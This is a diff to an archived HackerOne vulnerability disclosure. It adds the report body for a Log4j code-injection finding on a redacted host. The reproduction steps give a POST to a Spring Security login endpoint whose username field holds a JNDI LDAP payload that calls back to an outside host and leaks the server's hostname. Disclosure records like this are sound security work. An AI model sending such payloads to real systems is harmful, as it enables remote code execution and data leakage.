@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Code Injection"
 enriched: true
+body: true
 date: 2022-09-06
 submitted: 2022-07-08T13:59:08.921Z
 bounty_usd: null
@@ -25,6 +26,35 @@ title: "██████_log4j - https://██████"
 - Report: [https://hackerone.com/reports/1631364](https://hackerone.com/reports/1631364)
 - CWE: Code Injection
 - Submitted: 2022-07-08T13:59:08.921Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Hi security team, i found a log4j vulnerability in your aplication
+
+## Impact
+
+Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.
+
+## System Host(s)
+███████
+
+## Affected Product(s) and Version(s)
+
+
+## CVE Numbers
+
+
+## Steps to Reproduce
+Send POST request to this endpoint --->  https://██████/mifs/j_spring_security_check
+
+
+the post request: 
+
+j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee
+
+## Suggested Mitigation/Remediation Actions
 
 ## Timeline
 
